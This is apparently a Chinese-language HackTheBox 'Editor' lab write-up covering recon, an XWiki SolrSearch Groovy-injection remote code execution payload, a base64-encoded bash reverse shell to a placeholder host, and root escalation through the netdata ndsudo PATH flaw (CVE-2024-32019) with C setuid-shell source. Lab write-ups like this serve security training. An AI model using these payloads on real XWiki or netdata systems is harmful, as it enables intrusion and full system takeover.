---
title: HTB-Editor WriteUp
published: 2025-08-23
description: HackTheBox Editor 通关记录。
image: http://imgur.41an.com/picgo/2025-08/htb-editor-1755970219795.png
tags:
  - Penetration
  - PrivEsc
  - Linux
category: 打靶日记
draft: false
lang: zh_CN
---
## 1. Recon
```shell
nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v 10.10.11.80  
...  
PORT     STATE SERVICE  
22/tcp   open  ssh  
80/tcp   open  http  
8080/tcp open  http-proxy
```
访问`http://10.10.11.80:8080`时 ，页面提示`Did not follow redirect to http://editor.htb/` ，因此需要将该域名添加至`/etc/hosts`中进行解析。
```shell
echo "10.10.11.80 editor.htb wiki.editor.htb" > /etc/hosts
```
再次访问，可见其基于`XWIKI Debian 15.10.8`框架搭建。

![htb-editor-xwiki.png](http://imgur.41an.com/picgo/2025-08/htb-editor-xwiki-1755969256248.png)
## 2. Foothold

搜索发现其存在一个[远程代码执行的漏洞](https://www.exploit-db.com/exploits/52136)，尝试手动构造poc payload：

```python
http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println('cat /etc/passwd'.execute().text){{/groovy}}{{/async}}
```

![htb-editor-xwiki-poc.png](http://imgur.41an.com/picgo/2025-08/htb-editor-xwiki-poc-1755969271715.png)

构造反弹shell payload
1. 先将反弹命令以 `base64` 的形式编码

```shell
echo -n 'bash -i >& /dev/tcp/{YOUR_IP}/{YOUR_PORT} 0>&1' | base64
```
2. 再将其嵌入至xwiki payload中
```shell
http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{async async=false}}{{groovy}}
["/bin/bash","-c","echo {YOUR_BASE64_STR} | base64 -d | bash"].execute()
{{/groovy}}{{/async}}
```
3. 监听端口执行payload

![htb-editor-rev_shell.png](http://imgur.41an.com/picgo/2025-08/htb-editor-rev-shell-1755969308661.png)

反弹成功，看一下家目录，`xwiki`是个服务账户没有家目录，提权点应该在应用目录下。

![htb-editor-home.png](http://imgur.41an.com/picgo/2025-08/htb-editor-home-1755969321588.png)

在翻找`xwiki`配置文件的过程中找到口令。

![htb-editor-oliver-pwd.png](http://imgur.41an.com/picgo/2025-08/htb-editor-oliver-pwd-1755969344275.png)
## 3. PrivEsc
在枚举 `suid` 文件的过程中发现 `netdata` 目录下有 ` suid ` 权限的脚本。

![htb-editor-suid.png](http://imgur.41an.com/picgo/2025-08/htb-editor-suid-1755969359544.png)

1. 编写提权脚本
```c
#include <unistd.h>  // for setuid, setgid, execl
#include <stddef.h>  // for NULL

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", NULL);
    return 0;
}
```
2. 编译
```shell
x86_64-linux-gnu-gcc -o nvme CVE-2024-32019.c -static
```
3. 添加执行权限
```shell
chmod +x nvme
```
4. 添加至PATH环境中并执行

```shell
PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

![htb-editor-priv.png](http://imgur.41an.com/picgo/2025-08/htb-editor-priv-1755969369435.png)

---
## 4. Reference
-  [ndsudo: local privilege escalation via untrusted search path](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)
